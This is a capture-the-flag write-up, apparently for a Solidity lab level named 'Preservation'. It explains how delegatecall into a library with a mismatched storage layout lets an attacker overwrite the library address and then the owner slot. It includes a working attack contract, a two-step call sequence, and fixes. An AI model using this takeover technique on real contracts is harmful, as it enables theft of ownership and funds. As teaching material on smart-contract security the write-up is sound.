# Level 16: Preservation

## Goal

Become the owner of the Preservation contract.

## The contracts

```solidity
contract Preservation {
    address public timeZone1Library; // slot 0
    address public timeZone2Library; // slot 1
    address public owner;            // slot 2
    uint256 storedTime;              // slot 3

    function setFirstTime(uint256 _timeStamp) public {
        timeZone1Library.delegatecall(abi.encodeWithSignature("setTime(uint256)", _timeStamp));
    }
}

contract LibraryContract {
    uint256 storedTime; // slot 0
    function setTime(uint256 _time) public { storedTime = _time; }
}
```

## Vulnerability

Preservation `delegatecall`s into the library. With `delegatecall`, the library code runs against **Preservation's storage**. The library writes `storedTime` at **its** slot 0, but in Preservation slot 0 is `timeZone1Library`. So `setFirstTime` actually overwrites `timeZone1Library` with the value passed in.

That gives an attacker control over which contract Preservation delegatecalls next.

## Exploit

1. Deploy a malicious library whose storage layout lines up so `setTime` writes to slot 2 (`owner`):

```solidity
contract PreservationAttack {
    address public timeZone1Library; // slot 0
    address public timeZone2Library; // slot 1
    address public owner;            // slot 2

    function setTime(uint256) public {
        owner = msg.sender; // writes Preservation.owner via delegatecall
    }
}
```

2. Call `setFirstTime(uint256(uint160(attackAddress)))` -> overwrites `timeZone1Library` (slot 0) with your attack contract.
3. Call `setFirstTime(0)` again -> now Preservation delegatecalls **your** contract, whose `setTime` sets `owner = you` (slot 2).

## Fix

- Use the `library` keyword for stateless libraries, or ensure the delegate's storage layout **exactly** matches the caller's.
- Do not delegatecall to mutable, attacker-influenced addresses.
- Follow audited proxy patterns (e.g. OpenZeppelin) with explicit storage slots / gaps.

## Takeaway

`delegatecall` + mismatched storage layout = arbitrary state overwrite. Storage-layout collisions are one of the most dangerous proxy/upgrade bugs.
